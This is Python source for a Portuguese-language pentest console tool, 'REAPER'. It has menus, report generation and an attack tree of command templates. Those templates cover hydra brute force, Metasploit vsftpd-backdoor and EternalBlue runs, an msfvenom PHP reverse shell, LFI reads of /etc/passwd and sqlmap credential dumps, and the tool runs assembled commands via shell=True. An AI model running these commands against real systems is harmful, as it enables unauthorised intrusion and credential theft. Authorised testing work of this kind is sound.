            show_default = d and d_clean not in label_clean and label_clean not in d_clean
            if show_default:
                label_str = f"  [{color}]{p['label']}[/{color}] [dim]({d})[/dim]"
            else:
                label_str = f"  [{color}]{p['label']}[/{color}]"
            val = Prompt.ask(label_str, default=d)
            values[p["key"]] = val
    else:
        console.print(f"[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")

    # ── Verificação inteligente (theHarvester) ──────────────
    if tool.get("smart_check") == "harvester":
        import re as _re
        _tval = values.get("dominio", "")
        _is_ip = bool(_re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", _tval.split("/")[0]))
        if _is_ip:
            console.print()
            console.print(Panel(
                f"[yellow]⚠ [bold]{_tval}[/bold] é um IP — theHarvester é para domínios públicos.[/yellow]\n\n"
                f"[cyan]Para IPs usa:[/cyan]\n"
                f"  • nmap -sn {_tval}\n"
                f"  • netdiscover -r {_tval}/24\n"
                f"  • nmap -sV -sC {_tval}",
                border_style="yellow", title="[yellow]IP detectado[/yellow]"
            ))
            console.print()
            _ch2 = Prompt.ask(
                "  [1] Voltar (recomendado)\n"
                "  [2] Continuar mesmo assim\n"
                "  [3] Continuar com fontes mínimas\n\nEscolha"
            ).strip()
            if _ch2 == "1":
                _pause()
                return None
            elif _ch2 == "3":
                values["fonte"] = "duckduckgo,hackertarget"
        else:
            if values.get("fonte","").strip() == "all":
                console.print()
                console.print(Panel(
                    "[yellow]⚠ -b all vai dar muitos erros de API key.[/yellow]\n"
                    "[cyan]Recomendado:[/cyan] google,bing,duckduckgo,crtsh,hackertarget,rapiddns",
                    border_style="yellow"
                ))
                _ch3 = Prompt.ask("  [1] Usar fontes recomendadas\n  [2] Manter -b all\n\nEscolha").strip()
                if _ch3 == "1":
                    values["fonte"] = "google,bing,duckduckgo,crtsh,hackertarget,rapiddns"

    # Montar comando final
    cmd = tool["cmd"]
    for k, v in values.items():
        cmd = cmd.replace("{" + k + "}", v)

    console.print()
    console.print(Panel(f"[bold green]{cmd}[/bold green]",
                        title="Comando Gerado", border_style="green"))
    console.print()

    # Opções
    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    opts.add_column(style="bold cyan", width=6); opts.add_column()
    opts.add_row("[1]", "Executar agora neste terminal")
    opts.add_row("[2]", "Guardar comando nas notas da fase")
    opts.add_row("[3]", "Executar E guardar")
    opts.add_row("[B]", "Voltar sem fazer nada")
    console.print(opts)

    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()

    if ch in ["1", "3"]:
        console.print(f"\n[yellow]A executar:[/yellow] [bold green]{cmd}[/bold green]\n")
        console.print(Rule(style="dim green"))
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrompido. A voltar ao menu...[/yellow]")
        except Exception as _ex:
            console.print(f"\n[red]Erro ao executar: {_ex}[/red]")
        finally:
            console.print(Rule(style="dim green"))

    if ch in ["2", "3"]:
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        existing   = phase_data.get("notas", "")
        ts         = datetime.datetime.now().strftime("%H:%M:%S")
        entry      = f"[{ts}] {tool['name']}: {cmd}"
        phase_data["notas"] = (existing + "\n" + entry).strip()
        PROJECT["phases"][str(ph["id"])] = phase_data
        save_project()
        console.print(f"\n[green]✔ Comando guardado nas notas da fase {ph['id']}.[/green]")

    pause()

# ── Preencher dados ──────────────────────────────────────────
def fill_phase(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › PREENCHER DADOS[/{color}]",
        border_style=color))
    console.print("[dim]ENTER = manter valor actual  |  LIMPAR = apagar campo[/dim]\n")

    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
    for (fkey, flabel) in ph["fields"]:
        current = phase_data.get(fkey, "")
        display = (f"[dim](actual: {current[:55]}...)[/dim]" if len(current) > 55
                   else f"[dim](actual: {current})[/dim]" if current
                   else "[dim](vazio)[/dim]")
        console.print(f"[{color}]{flabel}[/{color}] {display}")
        val = Prompt.ask("  ▶", default="").strip()
        if val.upper() == "LIMPAR":
            phase_data[fkey] = ""
        elif val:
            phase_data[fkey] = val

    PROJECT["phases"][str(ph["id"])] = phase_data
    save_project()
    console.print(f"\n[green]✔ Dados guardados.[/green]")
    pause()

# ── Ver dados ────────────────────────────────────────────────
def view_phase_data(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › DADOS[/{color}]",
        border_style=color))
    console.print()
    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
    t = Table(box=box.ROUNDED, border_style=color, show_lines=True)
    t.add_column("Campo", style=f"bold {color}", width=24)
    t.add_column("Valor", style="white",          width=58)
    for (fkey, flabel) in ph["fields"]:
        v = phase_data.get(fkey, "")
        t.add_row(flabel, v if v else "[dim]—[/dim]")
    console.print(t)
    pause()

# ── Menu Relatório ───────────────────────────────────────────
def report_menu():
    banner()
    console.print(Panel("[bold blue]📄 GERAR RELATÓRIO[/bold blue]", border_style="blue"))
    if not PROJECT["name"]:
        console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
        pause(); return
    console.print()
    menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    menu.add_column(style="bold blue", width=6); menu.add_column()
    menu.add_row("[1]", "Relatório TXT")
    menu.add_row("[2]", "Relatório PDF (reportlab)")
    menu.add_row("[B]", "Voltar")
    console.print(menu)
    ch = Prompt.ask("[blue]REAPER › Relatório[/blue]").strip().upper()
    if ch == "1": generate_txt_report()
    elif ch == "2": generate_pdf_report()

# ── Relatório TXT ─────────────────────────────────────────────
def generate_txt_report():
    banner()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    lines = ["="*70,
             "  REAPER — Recon, Exploit, Analysis & Post-exploitation Reporting Engine",
             "  Autor: DarkReaper", "="*70,
             f"  Projecto : {PROJECT['name']}",
             f"  Alvo     : {PROJECT['target']}",
             f"  Data     : {PROJECT['date']}  |  Gerado em: {now}",
             "="*70, ""]
    for ph in PHASES:
        lines += ["─"*70, f"  FASE {ph['id']} — {ph['name']}", f"  {ph['desc']}", "─"*70]
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        for (fkey, flabel) in ph["fields"]:
            lines.append(f"  {flabel:<32}: {phase_data.get(fkey, '—')}")
        lines.append("")
    lines += ["="*70, "  FIM DO RELATÓRIO", "="*70]
    report = "\n".join(lines)
    console.print(report)
    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(report)
    console.print(f"\n[green]✔ Relatório guardado:[/green] [bold]{fname}[/bold]")
    pause()

# ── Relatório PDF ─────────────────────────────────────────────
def generate_pdf_report():
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.units import mm
        from reportlab.lib.styles import ParagraphStyle
        from reportlab.lib.enums import TA_CENTER
        from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
            Table as RLTable, TableStyle, HRFlowable, PageBreak, KeepTogether)
        from reportlab.lib.colors import HexColor
    except ImportError:
        console.print("[red]Instala reportlab: pip install reportlab --break-system-packages[/red]")
        pause(); return

    BG    = HexColor("#0d1117"); CARD  = HexColor("#161b22")
    GREY2 = HexColor("#21262d"); BORDER= HexColor("#30363d")
    ACCENT= HexColor("#e63946"); WHITE = HexColor("#e6edf3")
    GREY  = HexColor("#8b949e"); GREEN = HexColor("#39d353")
    PH_C  = [HexColor(c) for c in [
        "#00d4ff","#39d353","#bc8cff","#e3b341","#f85149","#ff6b35","#1f6feb"]]

    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.pdf"
    W, H  = A4

    def ps(n,**kw): return ParagraphStyle(n,**kw)
    S = {
        "title": ps("t", fontName="Helvetica-Bold", fontSize=22, textColor=ACCENT,  alignment=TA_CENTER, spaceAfter=4),
        "sub":   ps("s", fontName="Helvetica",      fontSize=10, textColor=WHITE,   alignment=TA_CENTER, spaceAfter=2),
        "meta":  ps("m", fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER, spaceAfter=2),
        "h2":    ps("h", fontName="Helvetica-Bold", fontSize=11, textColor=WHITE,   spaceBefore=6, spaceAfter=3),
        "body":  ps("b", fontName="Helvetica",      fontSize=9,  textColor=WHITE,   spaceAfter=3, leading=13),
        "small": ps("sm",fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER),
    }

    doc = SimpleDocTemplate(fname, pagesize=A4,
        leftMargin=15*mm, rightMargin=15*mm, topMargin=20*mm, bottomMargin=20*mm)
    story = []
    now   = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")

    # Capa
    story += [Spacer(1,18*mm), Paragraph("REAPER", S["title"]),
              Paragraph("Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", S["sub"]),
              HRFlowable(width="100%", thickness=1, color=ACCENT), Spacer(1,5*mm)]

    meta = RLTable([
        ["Projecto", PROJECT["name"],  "Alvo",    PROJECT["target"]],
        ["Analista", "DarkReaper",       "Data",    PROJECT["date"]],
        ["Gerado",   now,              "",        ""],
    ], colWidths=[28*mm, 72*mm, 24*mm, 56*mm])
    meta.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,-1),CARD), ("TEXTCOLOR",(0,0),(0,-1),GREY),
        ("TEXTCOLOR",(2,0),(2,-1),GREY),   ("TEXTCOLOR",(1,0),(1,-1),WHITE),
        ("TEXTCOLOR",(3,0),(3,-1),WHITE),  ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
        ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"), ("FONTNAME",(2,0),(2,-1),"Helvetica-Bold"),
        ("FONTSIZE",(0,0),(-1,-1),8), ("ROWBACKGROUNDS",(0,0),(-1,-1),[CARD,GREY2]),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
    ]))
    story += [meta, Spacer(1,6*mm)]

    # Sumário
    story.append(Paragraph("SUMÁRIO DE FASES", S["h2"]))
    sd = [["Fase","Nome","Estado"]]
    for ph in PHASES:
        pd2   = PROJECT["phases"].get(str(ph["id"]),{})
        fill  = len([v for v in pd2.values() if str(v).strip()])
        total = len(ph["fields"])
        estado= f"Completo ({fill}/{total})" if fill==total else \
                f"Parcial ({fill}/{total})"  if fill>0 else "Não preenchido"
        sd.append([str(ph["id"]), ph["name"], estado])
    st = RLTable(sd, colWidths=[14*mm,90*mm,76*mm])
    st.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,0),ACCENT), ("TEXTCOLOR",(0,0),(-1,0),WHITE),
        ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
        ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]), ("TEXTCOLOR",(0,1),(-1,-1),WHITE),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
        ("ALIGN",(0,0),(0,-1),"CENTER"),
    ]))
    story += [st, PageBreak()]

    # Fases
    for ph in PHASES:
        pc        = PH_C[ph["id"]-1]
        phase_data= PROJECT["phases"].get(str(ph["id"]),{})
        dark_text = HexColor("#0d1117")

        hdr = RLTable([[f"  FASE {ph['id']}  —  {ph['name']}  {ph['icon']}"]], colWidths=[180*mm])
        hdr.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,-1),pc), ("TEXTCOLOR",(0,0),(-1,-1),dark_text),
            ("FONTNAME",(0,0),(-1,-1),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),12),
            ("PADDING",(0,0),(-1,-1),8),
        ]))
        story += [KeepTogether([hdr, Spacer(1,2*mm)]), Paragraph(ph["desc"], S["body"]), Spacer(1,3*mm)]

        # Dados
        story.append(Paragraph("DADOS DO TESTE", ParagraphStyle("h3",
            fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3, spaceBefore=4)))
        dr = [["Campo","Valor"]]
        for (fk, fl) in ph["fields"]:
            dr.append([fl, phase_data.get(fk,"") or "—"])
        dt = RLTable(dr, colWidths=[55*mm,125*mm])
        dt.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,0),pc), ("TEXTCOLOR",(0,0),(-1,0),dark_text),
            ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
            ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]),
            ("TEXTCOLOR",(0,1),(0,-1),GREY), ("TEXTCOLOR",(1,1),(-1,-1),WHITE),
            ("FONTNAME",(0,1),(0,-1),"Helvetica-Bold"),
            ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
            ("VALIGN",(0,0),(-1,-1),"TOP"),
        ]))
        story += [dt, Spacer(1,4*mm)]

        # Ferramentas de referência
        phase_tools = TOOL_DEFINITIONS.get(ph["id"], [])
        if phase_tools:
            story.append(Paragraph("FERRAMENTAS DE REFERÊNCIA", ParagraphStyle("h3b",
                fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3)))
            tr = [["Ferramenta","Comando","Parâmetros necessários"]]
            for tool in phase_tools:
                param_list = ", ".join(p["label"] for p in tool["params"]) if tool["params"] else "—"
                tr.append([tool["name"], tool["cmd"], param_list])
            tt = RLTable(tr, colWidths=[30*mm,90*mm,60*mm])
            tt.setStyle(TableStyle([
                ("BACKGROUND",(0,0),(-1,0),GREY2), ("TEXTCOLOR",(0,0),(-1,0),pc),
                ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),7),
                ("ROWBACKGROUNDS",(0,1),(-1,-1),[HexColor("#0d1117"),CARD]),
                ("TEXTCOLOR",(0,1),(0,-1),WHITE), ("TEXTCOLOR",(1,1),(1,-1),GREEN),
                ("TEXTCOLOR",(2,1),(2,-1),GREY),  ("FONTNAME",(1,1),(1,-1),"Courier"),
                ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),4),
                ("VALIGN",(0,0),(-1,-1),"TOP"),
            ]))
            story.append(tt)
        story.append(PageBreak())

    story += [HRFlowable(width="100%",thickness=1,color=ACCENT), Spacer(1,3*mm),
              Paragraph(f"REAPER — Relatório Final  |  DarkReaper  |  {now}", S["small"])]

    def dark_bg(c, d):
        c.saveState(); c.setFillColor(BG)
        c.rect(0, 0, W, H, fill=1, stroke=0); c.restoreState()

    doc.build(story, onFirstPage=dark_bg, onLaterPages=dark_bg)
    console.print(f"\n[green]✔ PDF gerado:[/green] [bold]{fname}[/bold]")
    pause()


# ═══════════════════════════════════════════════════════════
#  MOTOR DE INTELIGÊNCIA — Vectores e Árvore de Decisão
# ═══════════════════════════════════════════════════════════

ATTACK_TREE = {

    # ── FTP ─────────────────────────────────────────────────
    "ftp": {
        "label": "FTP",
        "color": "cyan",
        "icon": "📁",
        "detect": lambda ports, banners: any(
            p in ports for p in ["21"]) or "ftp" in banners.lower(),
        "attacks": [
            {
                "name": "Acesso anónimo",
                "desc": "Testa login FTP sem credenciais (anonymous)",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "ftp -n {alvo} <<EOF\nquote USER anonymous\nquote PASS anonymous@\nls\nEOF",
                "simple_cmd": "ftp {alvo}",
                "followup": {
                    "success": ["ftp_list_files", "ftp_download"],
                    "fail":    ["ftp_brute", "ftp_exploit_version"]
                },
                "hints": "Quando ligar: user=anonymous  pass=(qualquer email ou vazio)"
            },
            {
                "name": "Brute force FTP (hydra)",
                "desc": "Ataque de dicionário às credenciais FTP",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador",        "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
                "followup": {
                    "success": ["ftp_login_creds"],
                    "fail":    ["ftp_exploit_version"]
                },
                "hints": "Se tiveres lista de users: substitui -l por -L users.txt"
            },
            {
                "name": "Exploit vsftpd 2.3.4 backdoor",
                "desc": "CVE backdoor famoso no vsftpd 2.3.4 — dá shell root",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {alvo}; run'",
                "followup": {
                    "success": ["privesc_tree"],
                    "fail":    ["ftp_brute"]
                },
                "hints": "Só funciona se a versão for exactamente vsftpd 2.3.4"
            },
            {
                "name": "Listar ficheiros FTP",
                "desc": "Após acesso — listar e descarregar ficheiros",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                    {"key": "user", "label": "Utilizador", "default": "anonymous"},
                    {"key": "pass_", "label": "Password",  "default": "anonymous"},
                ],
                "cmd": "ftp -n {alvo} <<EOF\nuser {user} {pass_}\nls -la\nbinary\nmget *\nEOF",
                "followup": {"success": ["analyse_files"], "fail": []},
                "hints": "mget * descarrega todos os ficheiros. Cuidado com tamanho."
            },
            {
                "name": "Searchsploit FTP",
                "desc": "Procurar exploits para a versão FTP encontrada",
                "params": [
                    {"key": "servico", "label": "Serviço/versão (ex: vsftpd 2.3.4)", "default": "vsftpd"},
                ],
                "cmd": "searchsploit {servico}",
                "followup": {"success": [], "fail": []},
                "hints": "Copia o caminho do exploit e usa searchsploit -m <path>"
            },
        ]
    },

    # ── SSH ─────────────────────────────────────────────────
    "ssh": {
        "label": "SSH",
        "color": "green",
        "icon": "🔐",
        "detect": lambda ports, banners: "22" in ports or "ssh" in banners.lower(),
        "attacks": [
            {
                "name": "Brute force SSH (hydra)",
                "desc": "Ataque de dicionário às credenciais SSH",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",         "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador",       "default": "root"},
                    {"key": "wordlist", "label": "Wordlist",         "default": "/usr/share/wordlists/rockyou.txt"},
                    {"key": "port",     "label": "Porto SSH",        "default": "22"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} -s {port} -t 4 ssh://{alvo}",
                "followup": {
                    "success": ["ssh_login", "privesc_tree"],
                    "fail":    ["ssh_user_enum", "ssh_exploit_version"]
                },
                "hints": "Começa com users comuns: root, admin, www-data, ubuntu, kali"
            },
            {
                "name": "Enumeração de utilizadores SSH",
                "desc": "Tentar descobrir usernames válidos no servidor SSH",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "nmap -p 22 --script ssh-auth-methods,ssh-hostkey {alvo}",
                "followup": {
                    "success": ["ssh_brute_user"],
                    "fail":    ["ssh_exploit_version"]
                },
                "hints": "Também podes usar: ssh-user-enum ou metasploit auxiliary/scanner/ssh/ssh_enumusers"
            },
            {
                "name": "Login SSH com credenciais",
                "desc": "Entrar no sistema com credenciais obtidas",
                "params": [
                    {"key": "user", "label": "Utilizador",  "default": ""},
                    {"key": "alvo", "label": "IP alvo",     "default": "{TARGET}"},
                    {"key": "port", "label": "Porto",       "default": "22"},
                ],
                "cmd": "ssh {user}@{alvo} -p {port}",
                "followup": {
                    "success": ["privesc_tree"],
                    "fail":    ["ssh_key_auth"]
                },
                "hints": "Após entrar corre: sudo -l  e  id  para ver privilégios"
            },
            {
                "name": "Exploit OpenSSH (searchsploit)",
                "desc": "Procurar exploits para a versão SSH encontrada",
                "params": [
                    {"key": "versao", "label": "Versão OpenSSH (ex: 7.4)", "default": ""},
                ],
                "cmd": "searchsploit openssh {versao}",
                "followup": {"success": [], "fail": []},
                "hints": "Verifica a versão exacta no output do nmap (-sV)"
            },
        ]
    },

    # ── HTTP / WEB ───────────────────────────────────────────
    "http": {
        "label": "HTTP / Web",
        "color": "yellow",
        "icon": "🌐",
        "detect": lambda ports, banners: any(
            p in ports for p in ["80","443","8080","8443","8888"]) or "http" in banners.lower(),
        "attacks": [
            {
                "name": "Nikto — scan vulnerabilidades web",
                "desc": "Scanner automático de vulnerabilidades HTTP",
                "params": [
                    {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto",         "default": "80"},
                ],
                "cmd": "nikto -h {alvo} -p {porto}",
                "followup": {
                    "success": ["web_sqli", "web_lfi", "web_upload"],
                    "fail":    ["gobuster_enum"]
                },
                "hints": "Procura no output por: SQL injection, LFI, upload, default creds"
            },
            {
                "name": "Gobuster — enumerar directorias",
                "desc": "Descobrir ficheiros e pastas escondidas",
                "params": [
                    {"key": "url",      "label": "URL alvo",   "default": "http://{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/dirb/common.txt"},
                    {"key": "ext",      "label": "Extensões",  "default": "php,html,txt,bak"},
                ],
                "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext}",
                "followup": {
                    "success": ["web_analyse_dirs"],
                    "fail":    ["feroxbuster_enum"]
                },
                "hints": "Atenção a: /admin, /backup, /config, /upload, .bak, .old"
            },
            {
                "name": "Feroxbuster — enumerar recursivo",
                "desc": "Fuzzing recursivo mais agressivo que gobuster",
                "params": [
                    {"key": "url",      "label": "URL alvo",          "default": "http://{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/dirb/common.txt"},
                    {"key": "depth",    "label": "Profundidade",      "default": "3"},
                ],
                "cmd": "feroxbuster -u {url} -w {wordlist} -d {depth} -x php,html,txt",
                "followup": {
                    "success": ["web_analyse_dirs"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Mais lento mas encontra mais — usa após gobuster falhar"
            },
            {
                "name": "WPScan — WordPress",
                "desc": "Detectar WordPress e enumerar users/plugins vulneráveis",
                "params": [
                    {"key": "url",  "label": "URL WordPress", "default": "http://{TARGET}"},
                    {"key": "enum", "label": "Enumeração",    "default": "u,vp,ap"},
                ],
                "cmd": "wpscan --url {url} -e {enum} --plugins-detection aggressive",
                "followup": {
                    "success": ["wp_brute", "wp_exploit_plugin"],
                    "fail":    ["web_sqli"]
                },
                "hints": "u=users  vp=plugins vulneráveis  ap=todos os plugins"
            },
            {
                "name": "SQLMap — SQL Injection",
                "desc": "Testar e explorar SQL Injection automaticamente",
                "params": [
                    {"key": "url",   "label": "URL com parâmetro (ex: http://alvo/page?id=1)", "default": ""},
                    {"key": "level", "label": "Nível (1-5)",   "default": "3"},
                    {"key": "risk",  "label": "Risco (1-3)",   "default": "2"},
                ],
                "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
                "followup": {
                    "success": ["sqli_dump", "sqli_shell"],
                    "fail":    ["web_lfi"]
                },
                "hints": "Encontrando DBs: adiciona --tables -D <db>  depois --dump -T <table>"
            },
            {
                "name": "SQLMap — dump de tabela",
                "desc": "Extrair dados de uma tabela específica",
                "params": [
                    {"key": "url",   "label": "URL vulnerável",  "default": ""},
                    {"key": "db",    "label": "Base de dados",   "default": ""},
                    {"key": "table", "label": "Tabela",          "default": "users"},
                ],
                "cmd": "sqlmap -u '{url}' -D {db} -T {table} --dump --batch",
                "followup": {
                    "success": ["crack_hashes"],
                    "fail":    ["web_lfi"]
                },
                "hints": "Procura tabelas: users, accounts, admin, passwords, credentials"
            },
            {
                "name": "LFI — Local File Inclusion",
                "desc": "Testar inclusão de ficheiros locais no servidor",
                "params": [
                    {"key": "url", "label": "URL com parâmetro (ex: http://alvo/page?file=)", "default": ""},
                ],
                "cmd": "curl '{url}../../../etc/passwd'",
                "followup": {
                    "success": ["lfi_log_poison", "lfi_read_files"],
                    "fail":    ["web_upload"]
                },
                "hints": "Tenta: ?file=  ?page=  ?include=  ?path=  ?lang=  ?template="
            },
            {
                "name": "Upload de shell web",
                "desc": "Fazer upload de reverse shell PHP para o servidor",
                "params": [
                    {"key": "url_upload", "label": "URL da página de upload", "default": ""},
                    {"key": "lhost",      "label": "Teu IP",                  "default": ""},
                    {"key": "lport",      "label": "Porta listener",          "default": "4444"},
                ],
                "cmd": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php && echo 'Shell criada: shell.php — faz upload manual'",
                "followup": {
                    "success": ["nc_listener", "privesc_tree"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Após upload navega para http://alvo/uploads/shell.php com o listener activo"
            },
            {
                "name": "Hydra — brute force HTTP form",
                "desc": "Força bruta num formulário de login web",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",                       "default": "{TARGET}"},
                    {"key": "path",     "label": "Path do login (ex: /login.php)","default": "/login.php"},
                    {"key": "user",     "label": "Utilizador",                    "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",                      "default": "/usr/share/wordlists/rockyou.txt"},
                    {"key": "fail_str", "label": "String de falha (ex: Invalid)", "default": "Invalid"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
                "followup": {
                    "success": ["web_authenticated"],
                    "fail":    ["web_sqli"]
                },
                "hints": "Inspecciona o HTML do form para ver os nomes dos campos (username/password)"
            },
        ]
    },

    # ── SMB ─────────────────────────────────────────────────
    "smb": {
        "label": "SMB / Samba",
        "color": "magenta",
        "icon": "🗄️",
        "detect": lambda ports, banners: any(
            p in ports for p in ["139","445"]) or "smb" in banners.lower() or "samba" in banners.lower(),
        "attacks": [
            {
                "name": "enum4linux — enumeração completa",
                "desc": "Enumerar utilizadores, partilhas e políticas SMB",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "enum4linux -a {alvo}",
                "followup": {
                    "success": ["smb_access_shares", "smb_brute"],
                    "fail":    ["smb_nmap"]
                },
                "hints": "Procura: utilizadores, partilhas acessíveis, versão Samba"
            },
            {
                "name": "smbclient — listar partilhas",
                "desc": "Listar e aceder a partilhas SMB sem autenticação",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "smbclient -L //{alvo} -N",
                "followup": {
                    "success": ["smb_access_share_anon"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Partilhas interessantes: Users, Backup, Admin, Data, Share"
            },
            {
                "name": "smbclient — aceder partilha",
                "desc": "Entrar numa partilha SMB específica",
                "params": [
                    {"key": "alvo",    "label": "IP alvo",        "default": "{TARGET}"},
                    {"key": "share",   "label": "Nome da partilha","default": ""},
                    {"key": "user",    "label": "Utilizador (-N para anon)", "default": "-N"},
                ],
                "cmd": "smbclient //{alvo}/{share} {user}",
                "followup": {
                    "success": ["smb_download_files"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Dentro da partilha: ls, get <ficheiro>, mget *"
            },
            {
                "name": "EternalBlue — MS17-010",
                "desc": "Exploit SMB crítico (Windows 7/2008 não patchado)",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",   "default": "{TARGET}"},
                    {"key": "lhost", "label": "Teu IP",    "default": ""},
                ],
                "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {alvo}; set LHOST {lhost}; run'",
                "followup": {
                    "success": ["privesc_tree", "dump_hashes"],
                    "fail":    ["smb_brute"]
                },
                "hints": "Verifica primeiro: nmap --script smb-vuln-ms17-010 {alvo}"
            },
            {
                "name": "Nmap SMB vulnerabilidades",
                "desc": "Verificar CVEs SMB com scripts NSE",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "nmap -p 139,445 --script smb-vuln* {alvo}",
                "followup": {
                    "success": ["smb_eternal_blue", "smb_brute"],
                    "fail":    []
                },
                "hints": "Procura: ms17-010 (EternalBlue), ms08-067, ms06-025"
            },
        ]
    },

    # ── SQL / Base de dados ──────────────────────────────────
    "sql": {
        "label": "SQL / Base de Dados",
        "color": "bright_red",
        "icon": "🗃️",
        "detect": lambda ports, banners: any(
            p in ports for p in ["3306","5432","1433","1521"]) or \
            any(s in banners.lower() for s in ["mysql","postgres","mssql","oracle"]),
        "attacks": [
            {
                "name": "MySQL — login sem password",
                "desc": "Testar acesso MySQL root sem autenticação",
                "params": [
                    {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
                ],
                "cmd": "mysql -h {alvo} -u root --password=''",
                "followup": {
                    "success": ["mysql_enum", "mysql_file_read"],
                    "fail":    ["mysql_brute"]
                },
                "hints": "Tenta também: -u admin, -u mysql, -u sa"
            },
            {
                "name": "MySQL — brute force",
                "desc": "Força bruta às credenciais MySQL",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "root"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} {alvo} mysql",
                "followup": {
                    "success": ["mysql_enum"],
                    "fail":    []
                },
                "hints": "Após acesso: show databases;  use <db>;  show tables;  select * from users;"
            },
            {
                "name": "MySQL — ler ficheiros do sistema",
                "desc": "Usar LOAD_FILE para ler ficheiros sensíveis",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "root"},
                    {"key": "pass_",    "label": "Password",   "default": ""},
                    {"key": "ficheiro", "label": "Ficheiro",   "default": "/etc/passwd"},
                ],
                "cmd": "mysql -h {alvo} -u {user} -p{pass_} -e \"SELECT LOAD_FILE('{ficheiro}');\"",
                "followup": {"success": [], "fail": []},
